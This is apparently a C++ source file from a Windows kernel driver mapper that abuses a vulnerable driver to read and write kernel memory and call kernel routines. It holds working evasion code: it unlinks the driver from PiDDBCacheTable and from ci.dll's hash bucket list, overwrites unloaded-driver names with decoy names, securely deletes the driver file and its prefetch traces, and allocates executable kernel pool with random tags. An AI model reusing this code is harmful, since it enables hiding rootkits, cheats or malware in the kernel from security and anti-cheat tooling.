	kernel_MmGetPhysicalAddress = 0;
	ntoskrnlPhysBase = 0;
	ntoskrnlImageSize = 0;

	g_stubPool.clear();
	g_stubPoolReady = false;
	g_section_cache.clear();

	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
		CloseHandle(hDevice);
	hDevice = 0;

	auto status = service::StopAndRemove(GetDriverNameW());

	std::wstring driver_path = GetDriverPath();
	if (!driver_path.empty()) {
		CleanupPrefetch(driver_path);
		SecureDeleteFile(driver_path);
	}

	loadedSymlinkName.clear();

	return NT_SUCCESS(status) ? STATUS_SUCCESS : status;
}

uint64_t vdrv::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;
	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000)
				return 0;

			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0;
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool vdrv::ClearMmUnloadedDrivers() {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == nullptr)
	{
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;
	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == hDevice)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;
	if (!ReadMemory(object + 0x8, &device_object, sizeof(device_object)) || !device_object)
		return false;

	uint64_t driver_object = 0;
	if (!ReadMemory(device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object)
		return false;

	uint64_t driver_section = 0;
	if (!ReadMemory(driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section)
		return false;

	UNICODE_STRING us_driver_base_dll_name = { 0 };
	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0)
		return false;

	if (us_driver_base_dll_name.Buffer && us_driver_base_dll_name.MaximumLength) {
		static const wchar_t* decoys[] = {
			L"USBHub3Loader.sys",
			L"WudfRd.sys",
			L"BthHfEnum.sys",
			L"HidUsb.sys",
			L"monitor.sys",
			L"wmbclass.sys",
			L"umbus.sys",
			L"swenum.sys",
			L"ndisuio.sys",
			L"netbt.sys"
		};
		const wchar_t* chosen = nullptr;
		size_t chosen_bytes = 0;
		uint32_t seed = kdmUtils::CryptoRand32();
		for (uint32_t attempt = 0; attempt < (sizeof(decoys) / sizeof(decoys[0])); attempt++) {
			const wchar_t* candidate = decoys[(seed + attempt) % (sizeof(decoys) / sizeof(decoys[0]))];
			size_t need = wcslen(candidate) * sizeof(wchar_t);
			if (need + sizeof(wchar_t) <= us_driver_base_dll_name.MaximumLength) {
				chosen = candidate;
				chosen_bytes = need;
				break;
			}
		}

		auto fillBuf = std::make_unique<uint8_t[]>(us_driver_base_dll_name.MaximumLength);
		if (chosen) {
			memcpy(fillBuf.get(), chosen, chosen_bytes);
		}
		WriteMemory((uintptr_t)us_driver_base_dll_name.Buffer, fillBuf.get(), us_driver_base_dll_name.MaximumLength);

		if (chosen) {
			us_driver_base_dll_name.Length = (USHORT)chosen_bytes;
		}
		else {
			us_driver_base_dll_name.Length = 0;
		}

		if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
			return false;

		return true;
	}

	us_driver_base_dll_name.Length = 0;
	us_driver_base_dll_name.MaximumLength = 0;
	us_driver_base_dll_name.Buffer = nullptr;

	if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
		return false;

	return true;
}

PVOID vdrv::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(Instr + OffsetOffset, &RipOffset, sizeof(LONG)))
		return nullptr;
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

bool vdrv::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExAcquireResourceExclusiveLite"));
	if (!kernel_ExAcquireResourceExclusiveLite)
		return 0;

	BOOLEAN out;
	return (CallKernelFunction(&out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool vdrv::ExReleaseResourceLite(PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExReleaseResourceLite"));
	if (!kernel_ExReleaseResourceLite)
		return false;

	return CallKernelFunction<void>(nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN vdrv::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("RtlDeleteElementGenericTableAvl"));
	if (!kernel_RtlDeleteElementGenericTableAvl)
		return false;

	bool out;
	return (CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

PVOID vdrv::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlLookupElementGenericTableAvl = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("RtlLookupElementGenericTableAvl"));
	if (!kernel_RtlLookupElementGenericTableAvl)
		return nullptr;

	PVOID out;
	if (!CallKernelFunction(&out, kernel_RtlLookupElementGenericTableAvl, Table, Buffer))
		return 0;
	return out;
}

nt::PiDDBCacheEntry* vdrv::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
	nt::PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
}

bool vdrv::ClearPiDDBCacheTable() {
	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx");

	if (PiDDBLockPtr == NULL) {
		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x");
		if (PiDDBLockPtr == NULL) {
			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x");
			if (PiDDBLockPtr == NULL)
				return false;
			PiDDBLockPtr += 19;
		}
		else {
			PiDDBLockPtr += 16;
		}
	}
	else {
		PiDDBLockPtr += 28;
	}

	if (PiDDBCacheTablePtr == NULL) {
		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx");
		if (PiDDBCacheTablePtr == NULL)
			return false;
		PiDDBCacheTablePtr += 2;
	}

	PVOID PiDDBLock = ResolveRelativeAddress((PVOID)PiDDBLockPtr, 3, 7);
	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)ResolveRelativeAddress((PVOID)PiDDBCacheTablePtr, 6, 10);

	if (!ExAcquireResourceExclusiveLite(PiDDBLock, true))
		return false;

	auto n = GetDriverNameW();
	auto timestamp = vdrv::loadedDriverTimestamp;

	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());

	if (pFoundEntry == nullptr) {
		ULONG elemCount = 0;
		ReadMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, NumberGenericTableElements), &elemCount, sizeof(ULONG));
		if (elemCount > 0 && elemCount < 4096) {
			nt::PRTL_BALANCED_LINKS root = nullptr;
			ReadMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, BalancedRoot.RightChild), &root, sizeof(root));

			std::vector<uintptr_t> stack;
			if (root)
				stack.push_back((uintptr_t)root);

			while (!stack.empty() && !pFoundEntry) {
				uintptr_t node = stack.back();
				stack.pop_back();

				nt::RTL_BALANCED_LINKS links{};
				if (!ReadMemory(node, &links, sizeof(links)))
					continue;

				if (links.LeftChild)
					stack.push_back((uintptr_t)links.LeftChild);
				if (links.RightChild)
					stack.push_back((uintptr_t)links.RightChild);

				uintptr_t entry_candidate = node + sizeof(nt::RTL_BALANCED_LINKS);
				UNICODE_STRING drvName{};
				if (!ReadMemory(entry_candidate + offsetof(struct nt::_PiDDBCacheEntry, DriverName), &drvName, sizeof(drvName)))
					continue;

				if (!drvName.Buffer || drvName.Length == 0 || drvName.Length > 512)
					continue;

				auto nameBuf = std::make_unique<wchar_t[]>(drvName.Length / 2 + 1);
				if (!ReadMemory((uintptr_t)drvName.Buffer, nameBuf.get(), drvName.Length))
					continue;

				if (wcsstr(nameBuf.get(), n.c_str())) {
					pFoundEntry = reinterpret_cast<nt::PiDDBCacheEntry*>(entry_candidate);
				}
			}
		}
	}

	if (pFoundEntry == nullptr) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	PLIST_ENTRY prev;
	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	if (!WriteMemory((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	if (!WriteMemory((uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	ULONG cacheDeleteCount = 0;
	ReadMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		WriteMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	}

	ULONG restartKeyBefore = 0;
	ReadMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, WhichOrderedElement), &restartKeyBefore, sizeof(ULONG));
	if (restartKeyBefore > 1) {
		ULONG newKey = restartKeyBefore - 1;
		WriteMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, WhichOrderedElement), &newKey, sizeof(ULONG));
	}

	PVOID zeroPtr = nullptr;
	WriteMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, OrderedPointer), &zeroPtr, sizeof(PVOID));
	WriteMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, RestartKey), &zeroPtr, sizeof(PVOID));

	ExReleaseResourceLite(PiDDBLock);
	return true;
}

struct CachedSection {
	uint64_t module_base;
	std::string section_name;
	uint64_t section_vaddr;
	uint32_t section_size;
	std::vector<uint8_t> data;
};

static std::vector<CachedSection> g_section_cache;

static CachedSection* GetOrCacheSection(const char* sectionName, uint64_t modulePtr) {
	for (auto& c : g_section_cache) {
		if (c.module_base == modulePtr && c.section_name == sectionName)
			return &c;
	}

	ULONG sectionSize = 0;
	uintptr_t section = vdrv::FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
	if (!section || !sectionSize)
		return nullptr;

	if (sectionSize > 64 * 1024 * 1024)
		return nullptr;

	CachedSection newEntry;
	newEntry.module_base = modulePtr;
	newEntry.section_name = sectionName;
	newEntry.section_vaddr = section;
	newEntry.section_size = sectionSize;
	newEntry.data.resize(sectionSize);
	if (!vdrv::ReadMemory(section, newEntry.data.data(), sectionSize))
		return nullptr;

	g_section_cache.push_back(std::move(newEntry));
	return &g_section_cache.back();
}

uintptr_t vdrv::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress)
		return 0;

	if (dwLen > 1024 * 1024 * 1024)
		return 0;

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(dwAddress, sectionData.get(), dwLen))
		return 0;

	auto result = kdmUtils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
	if (result <= 0)
		return 0;

	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

uintptr_t vdrv::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(modulePtr, headers, 0x1000))
		return 0;

	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)kdmUtils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize)
		return 0;

	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t vdrv::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	CachedSection* cs = GetOrCacheSection(sectionName, modulePtr);
	if (!cs)
		return 0;

	uintptr_t local_result = kdmUtils::FindPattern((uintptr_t)cs->data.data(), cs->section_size, bMask, szMask);
	if (local_result <= 0)
		return 0;

	return cs->section_vaddr + (local_result - (uintptr_t)cs->data.data());
}

bool vdrv::ClearKernelHashBucketList() {
	uint64_t ci = kdmUtils::GetKernelModuleAddress(ENC("ci.dll"));
	if (!ci)
		return false;

	auto sig = FindPatternInSectionAtKernel("PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
	if (!sig)
		return false;

	auto sig2 = FindPatternAtKernel((uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2)
		return false;

	const auto g_KernelHashBucketList = ResolveRelativeAddress((PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress((PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
		return false;

	if (!ExAcquireResourceExclusiveLite(g_HashCacheLock, true))
		return false;

	nt::HashBucketEntry* prev = (nt::HashBucketEntry*)g_KernelHashBucketList;
	nt::HashBucketEntry* entry = 0;
	if (!ReadMemory((uintptr_t)prev, &entry, sizeof(entry))) {
		ExReleaseResourceLite(g_HashCacheLock);
		return false;
	}
	if (!entry) {
		ExReleaseResourceLite(g_HashCacheLock);
		return true;
	}

	std::wstring wdname = GetDriverNameW();
	std::wstring search_path = GetDriverPath();
	SIZE_T expected_len = (search_path.length() - 2) * 2;

	while (entry) {
		USHORT wsNameLen = 0;
		if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			ExReleaseResourceLite(g_HashCacheLock);
			return false;
		}

		if (expected_len == wsNameLen) {
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				ExReleaseResourceLite(g_HashCacheLock);
				return false;
			}

			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				ExReleaseResourceLite(g_HashCacheLock);
				return false;
			}

			size_t find_result = std::wstring(wsName.get()).find(wdname);
			if (find_result != std::wstring::npos) {
				nt::HashBucketEntry* Next = 0;
				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(Next))) {
					ExReleaseResourceLite(g_HashCacheLock);
					return false;
				}

				if (!WriteMemory((uintptr_t)prev, &Next, sizeof(Next))) {
					ExReleaseResourceLite(g_HashCacheLock);
					return false;
				}

				if (!FreePool((uintptr_t)entry)) {
					ExReleaseResourceLite(g_HashCacheLock);
					return false;
				}

				ExReleaseResourceLite(g_HashCacheLock);
				return true;
			}
		}
		prev = entry;
		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(entry))) {
			ExReleaseResourceLite(g_HashCacheLock);
			return false;
		}
	}

	ExReleaseResourceLite(g_HashCacheLock);
	return false;
}

uint64_t vdrv::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	ULONG randomTag = kdmUtils::GenerateRandomPoolTag();

	static uint64_t kernel_ExAllocatePool2 = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExAllocatePool2"));
	if (kernel_ExAllocatePool2) {
		const uint64_t POOL_FLAG_NON_PAGED          = 0x0000000000000040ull;
		const uint64_t POOL_FLAG_NON_PAGED_EXECUTE  = 0x0000000000000080ull;
		uint64_t flags = POOL_FLAG_NON_PAGED_EXECUTE;
		uint64_t allocated_pool = 0;
		if (CallKernelFunction(&allocated_pool, kernel_ExAllocatePool2, flags, size, (uint64_t)randomTag) && allocated_pool)
			return allocated_pool;
	}

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExAllocatePoolWithTag"));
	if (!kernel_ExAllocatePool)
		return 0;

	uint64_t allocated_pool = 0;
	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, randomTag))
		return 0;

	return allocated_pool;
}

bool vdrv::FreePool(uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExFreePool"));
	if (!kernel_ExFreePool)
		return 0;

	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
}

uint64_t vdrv::MmAllocateIndependentPagesEx(uint32_t size)
{
	uint64_t allocated_pages{};
	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = vdrv::FindPatternInSectionAtKernel((char*)".text", vdrv::ntoskrnlAddr,
			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
			(char*)"xxxxxxxxx????xxx");
		if (!kernel_MmAllocateIndependentPagesEx)
			return 0;

		kernel_MmAllocateIndependentPagesEx += 8;
		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		if (!kernel_MmAllocateIndependentPagesEx)
			return 0;
	}

	if (!vdrv::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

bool vdrv::MmFreeIndependentPages(uint64_t address, uint32_t size)
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
		kernel_MmFreeIndependentPages = vdrv::FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr,
			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
			(char*)"xxxxxxxxx????xxxxxxx");
		if (!kernel_MmFreeIndependentPages) {
			kernel_MmFreeIndependentPages = vdrv::FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr,
				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
				(char*)"xx????xxxx????xxx");

			if (!kernel_MmFreeIndependentPages)
				return false;

			kernel_MmFreeIndependentPages += 9;
		}
		else {
			kernel_MmFreeIndependentPages += 8;
		}

		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
		if (!kernel_MmFreeIndependentPages)
			return false;
	}

	uint64_t result{};
	return vdrv::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
}

BOOLEAN vdrv::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
		return FALSE;

	static uint64_t kernel_MmSetPageProtection = 0;

	if (!kernel_MmSetPageProtection)
	{
		kernel_MmSetPageProtection = vdrv::FindPatternInSectionAtKernel("PAGELK", vdrv::ntoskrnlAddr,
			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
			(char*)"xx??x???xxx");
		if (!kernel_MmSetPageProtection) {
			kernel_MmSetPageProtection = vdrv::FindPatternInSectionAtKernel("PAGELK", vdrv::ntoskrnlAddr,
				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
				(char*)"xx??xx????x???xxx");
			if (!kernel_MmSetPageProtection)
				return FALSE;
			kernel_MmSetPageProtection += 13;
		}
		else {
			kernel_MmSetPageProtection += 10;
		}

		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmSetPageProtection, 1, 5);
		if (!kernel_MmSetPageProtection)
			return FALSE;
	}

	BOOLEAN set_prot_status{};
	if (!vdrv::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}
